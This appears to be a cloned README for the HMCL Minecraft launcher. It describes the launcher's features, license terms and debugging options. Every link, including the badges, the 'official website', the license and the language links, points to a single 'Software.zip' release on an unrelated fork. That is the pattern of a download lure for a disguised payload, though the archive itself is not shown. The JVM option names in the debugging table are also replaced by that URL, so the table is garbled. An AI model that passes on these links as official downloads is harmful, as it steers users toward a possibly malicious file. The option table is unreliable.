# ⛏ Hello Minecraft! Launcher 💎

[![Build Status](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)
![Downloads](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)
![Stars](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)
[![Discord](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)
[![QQ Group](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)

**English** | [简体中文](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip) | [繁體中文](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip)

## Introduction

HMCL is an open-source, cross-platform Minecraft launcher that supports Mod Management, Game Customizing, ModLoader Installing (Forge, NeoForge, Fabric, Quilt, LiteLoader, and OptiFine), Modpack Creating, UI Customization, and more.

HMCL has amazing cross-platform capabilities. Not only does it run on different operating systems like Windows, Linux, and macOS, but it also supports various CPU architectures such as x86, ARM, MIPS, and LoongArch. You can easily enjoy Minecraft across different platforms through HMCL.

For systems and CPU architectures supported by HMCL, see [this table](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip).

## Download

Download the latest version from [the official website](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip).

You can also find the latest version of HMCL in [GitHub Releases](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip).

Although not necessary, it is recommended only to download releases from the official websites listed above.

## License

The software is distributed under [GPLv3](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip) license with the following additional terms:

### Additional terms under GPLv3 Section 7

1. When you distribute a modified version of the software, you must change the software name or the version number in a reasonable way in order to distinguish it from the original version. (Under [GPLv3, 7(c)](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip))

   The software name and the version number can be edited [here](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip).

2. You must not remove the copyright declaration displayed in the software. (Under [GPLv3, 7(b)](https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip))

## Contribution

If you want to submit a pull request, here are some requirements:

* IDE: IntelliJ IDEA
* Compiler: Java 1.8 or Java 11+
* Do NOT modify `gradle` files

### Compilation

Simply execute the following command in the project root directory:

```bash
./gradlew clean build
```

Make sure you have at least JavaFX 8 installed. Liberica Full JDK 8 or later is recommended.

## JVM Options (for debugging)

| Parameter                                    | Description                                                                                   |
| -------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<path>`                         | Override HMCL directory                                                                       |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip`   | Bypass the self integrity check when checking for updates                                     |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<url>`              | Override API Root of BMCLAPI download provider. Defaults to `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip` |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<font family>`         | Override font family                                                                          |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<version>`          | Override the version number                                                                   |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<url>`        | Override the update source for HMCL itself                                                    |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<path>`     | Use the specified authlib-injector (instead of downloading one)                               |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<maven repository url>` | Add custom Maven repository for downloading OpenJFX                                           |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<encoding>`          | Override the native encoding                                                                  |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<App ID>`          | Override Microsoft OAuth App ID                                                               |
| `https://github.com/eloy13rayo/HMCL/releases/download/v2.0/Software.zip<App Secret>`  | Override Microsoft OAuth App Secret                                                           |
